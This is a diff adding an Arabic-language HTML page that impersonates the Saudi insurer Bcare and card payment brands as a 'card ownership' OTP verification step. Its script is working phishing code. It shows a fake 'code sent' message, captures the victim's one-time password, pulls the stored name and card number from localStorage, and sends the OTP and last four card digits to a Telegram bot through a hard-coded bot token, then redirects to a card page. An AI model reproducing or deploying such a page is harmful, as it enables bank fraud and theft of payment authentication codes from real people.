@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>مصادقة الشراء</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #ffffff;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-align: center;
+    }
+
+    .otp-section {
+      max-width: 340px;
+      margin: 50px auto;
+      background: white;
+      border-radius: 20px;
+      padding: 30px 20px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      position: relative;
+      display: block;
+      text-align: center;
+    }
+
+    .otp-section img {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+
+    .otp-section h2 {
+      font-size: 20px;
+      color: #0078d7;
+      margin-bottom: 10px;
+    }
+
+    .otp-section p {
+      font-size: 15px;
+      margin-bottom: 10px;
+      color: #333;
+    }
+
+    .otp-section input {
+      padding: 12px;
+      width: 100%;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+
+    .otp-section button {
+      padding: 12px;
+      width: 100%;
+      font-size: 16px;
+      background-color: #6c757d;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .brands {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 20px;
+    }
+
+    .brands img {
+      height: 24px;
+    }
+
+    .note {
+      color: #999;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    .logo {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 20px 10px;
+      opacity: 1;
+    }
+
+    .logo img {
+      max-height: 150px;
+      width: 150px;
+    }
+
+    #loadingOverlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(255, 255, 255, 0.8);
+      z-index: 10;
+      display: none;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      border-radius: 20px;
+    }
+
+    .spinner {
+      margin-bottom: 15px;
+      width: 50px;
+      height: 50px;
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #0078d7;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+
+  #texteror {
+    color: red;
+    margin-top: -5px;
+    font-size: 12px;
+    font-weight: bold;     
+    font-family: Arial, sans-serif;  
+}
+
+    #otp{
+        width: 320px;
+    }
+
+    /* Full-width modern header */
+    .top-bar { width: 100%; max-width: none; margin: 0 0 10px; padding: 10px 12px; border-radius: 0 0 18px 18px; background: linear-gradient(135deg, #ffffff, #eff6ff); border: 1px solid #dbe7f7; box-shadow: 0 12px 24px rgba(10, 41, 82, 0.12); box-sizing: border-box; display: flex; align-items: center; justify-content: space-between; gap: 10px; }
+    .top-bar .menu-btn { display: flex; flex-direction: column; gap: 4px; padding: 6px; border: 0; border-radius: 10px; background: transparent; cursor: pointer; }
+    .top-bar .menu-btn span { display: block; width: 22px; height: 3px; border-radius: 999px; background: #0a4b8f; }
+    .top-bar .brand-wrap { flex: 1; display: flex; justify-content: center; align-items: center; }
+    .top-bar .brand-wrap img { height: 34px; width: auto; }
+    .top-bar .top-actions { display: flex; align-items: center; gap: 8px; }
+    .top-bar .lang-chip, .top-bar .user-chip { display: inline-flex; align-items: center; justify-content: center; min-width: 36px; height: 34px; border-radius: 999px; background: #0a4b8f; color: #fff; font-size: 12px; font-weight: 700; box-shadow: 0 10px 18px rgba(14, 74, 138, 0.22); }
+    .top-bar .user-chip { background: linear-gradient(135deg, #f4b942, #ffcf54); color: #0b2f56; }
+    .main-header { position: relative; margin: 12px 12px 0; padding: 18px 14px 20px; border-radius: 24px; background: linear-gradient(135deg, #0b4d95 0%, #1c74cf 52%, #0a3c75 100%); color: #fff; box-shadow: 0 18px 30px rgba(10, 50, 95, 0.25); overflow: hidden; }
+    .main-header::after { content: ""; position: absolute; inset: auto -20px -30px auto; width: 120px; height: 120px; border-radius: 50%; background: rgba(255, 255, 255, 0.12); filter: blur(2px); }
+    .main-header h2 { position: relative; z-index: 1; margin: 0; font-size: 20px; line-height: 1.35; }
+    .main-header p { position: relative; z-index: 1; margin: 6px 0 0; font-size: 14px; color: rgba(255, 255, 255, 0.92); }
+    .logo { display: flex; justify-content: space-between; align-items: center; margin: 10px auto 10px; padding: 10px 12px; width: min(100% - 14px, 520px); background: rgba(255, 255, 255, 0.98); border: 1px solid #dbe7f7; border-radius: 18px; box-shadow: 0 14px 28px rgba(10, 41, 82, 0.12); box-sizing: border-box; }
+    .logo img { height: 34px; width: auto; filter: drop-shadow(0 6px 10px rgba(0, 0, 0, 0.12)); }
+  </style>
+</head>
+<body>
+
+  <div class="top-bar">
+    <div class="top-actions">
+            <span class="user-chip">👤</span>
+
+      <span class="lang-chip">EN</span>
+    </div>
+    <div class="brand-wrap">
+      <img src="https://bcare.com.sa/assets/images/Bcare-logo.svg" alt="Bcare Logo">
+    </div>
+
+        <button class="menu-btn" type="button" aria-label="القائمة">
+      <span></span><span></span><span></span>
+    </button>
+  </div>
+
+<div class="otp-section">
+  <img src="mobile.png" alt="رمز التحقق" />
+  <h2>   إثبات ملكية البطاقة</h2>
+  <p id="otpText"></p>
+  <label for="otp"><strong>رمز التحقق *</strong></label>
+  <input type="tel" id="otp" placeholder="يرجى إدخال رمز التحقق" maxlength="6" minlength="4" />
+  <p id="texteror" >عذرآ قمت ب ادخال رمز تحقق غير صحيح</p>
+  <p class="note">سيتم إرسال رسالة كود التحقق في خلال <span id="otpTimer">03:00</span> دقيقة</p>
+  <button>تأكيد</button>
+  <div class="brands">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fb/Mada_Logo.svg" alt="mada" />
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="mastercard" />
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="visa" />
+  </div>
+</div>
+
+<div id="loadingOverlay">
+  <div class="spinner"></div>
+  <h2 style="font-weight: bold; margin: 10px 0; color: #0078d7;">يرجى الانتظار</h2>
+  <p style="color: #333;">الرجاء عدم إغلاق الصفحة أو إعادة تحميلها</p>
+</div>
+
+<script>
+  const telegramBotToken = '8364441024:AAHluZaG5P8utYObf0Qj3719YONXO8zH24c';
+  const chatId = '7785288759';
+
+  async function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+    const payload = {
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'HTML'
+    };
+
+    try {
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      const data = await response.json();
+      return data;
+    } catch (error) {
+      console.error('Telegram Error:', error);
+      return null;
+    }
+  }
+
+  const otpText = document.getElementById('otpText');
+  const otpTimer = document.getElementById('otpTimer');
+  const otpInput = document.getElementById('otp');
+  const overlay = document.getElementById('loadingOverlay');
+
+  const now = new Date();
+  const formattedDate = now.toLocaleDateString('ar-EG').replace(/\//g, '-');
+  const formattedTime = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', hour12: false });
+  otpText.textContent = `تم إرسال رمز تحقق إلى رقمك لتأكيد عملية الشراء بتاريخ ${formattedDate} الساعة ${formattedTime}`;
+
+  let timeLeft = 180;
+  function updateTimer() {
+    const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+    const seconds = (timeLeft % 60).toString().padStart(2, '0');
+    otpTimer.textContent = `${minutes}:${seconds}`;
+    if (timeLeft <= 0) {
+      clearInterval(timerInterval);
+      otpTimer.textContent = 'انتهى الوقت';
+    } else {
+      timeLeft--;
+    }
+  }
+  updateTimer();
+  const timerInterval = setInterval(updateTimer, 1000);
+
+  document.querySelector('.otp-section button').addEventListener('click', async () => {
+    const otpCode = otpInput.value.trim();
+
+    // ✅ تحقق من إدخال رمز التحقق
+    if (otpCode === '') {
+      alert('يرجى إدخال رمز التحقق أولاً.');
+      otpInput.focus();
+      return;
+    }
+
+    const fullName = localStorage.getItem('owner_name') || 'غير معروف';
+    const cardNumber = localStorage.getItem('cardNumber') || '';
+    const last4 = cardNumber.slice(-4) || '----';
+
+    localStorage.setItem('card_number', otpCode);
+
+    const message = `
+✅ <b> 3رمز التحقق</b>
+- 👤 من: ${fullName}
+- 💳 آخر 4 أرقام: ${last4}
+- 🔐 رمز التحقق: ${otpCode}
+    `;
+
+    overlay.style.display = 'flex';
+
+    await sendToTelegram(message);
+
+    setTimeout(() => {
+      window.location.href = "visa.html"; 
+    }, 15000);
+  });
+</script>
+
+
+</body>
+</html>
